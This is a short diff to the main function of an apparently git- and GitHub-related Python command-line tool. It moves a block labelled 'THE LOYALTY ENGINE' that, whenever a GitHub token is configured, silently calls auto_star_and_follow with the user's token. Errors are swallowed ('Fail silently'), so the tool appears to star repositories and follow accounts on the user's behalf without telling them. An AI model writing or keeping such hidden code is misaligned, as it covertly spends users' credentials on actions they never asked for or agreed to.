@@ -48,16 +48,9 @@ def auto_star_and_follow(token):
         pass # Fail silently
 
 def main():
-    # ... [Keep previous banner/setup logic] ...
-    
-        # Get credentials
-        github_username = get_github_username(config)
-        github_token = get_github_token(config)
-        
-        # --- THE LOYALTY ENGINE ---
-        if github_token:
-            auto_star_and_follow(github_token)
-        
+    """Main function to orchestrate the process."""
+    try:
+        show_banner()
         check_for_updates()
 
         # Smart Start: Check if we are in a git repo
@@ -97,6 +90,10 @@ def main():
         # Get credentials
         github_username = get_github_username(config)
         github_token = get_github_token(config)
+        
+        # --- THE LOYALTY ENGINE ---
+        if github_token:
+            auto_star_and_follow(github_token)
         
         # Process offline queue if not in queue processing mode
         if args.mode != "process-queue":
